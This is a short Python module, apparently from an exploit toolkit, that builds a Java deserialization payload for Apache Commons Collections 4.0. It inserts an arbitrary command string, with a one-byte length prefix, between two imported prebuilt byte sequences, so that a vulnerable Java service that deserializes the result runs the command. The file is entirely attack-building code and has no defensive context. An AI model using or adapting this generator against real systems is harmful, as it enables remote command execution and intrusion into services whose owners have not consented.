from src.payloads.generate_commons_collections40_payload import payloads_1__generate_commons_collections40_payload, \
    payloads_2__generate_commons_collections40_payload


def generate_commons_collections40_payload(cmd: str) -> bytes:
    payload = payloads_1__generate_commons_collections40_payload
    cmd_bytes = cmd.encode('utf-8')
    payload += len(cmd_bytes).to_bytes(1, 'big') + cmd_bytes
    payload += payloads_2__generate_commons_collections40_payload
    return payload

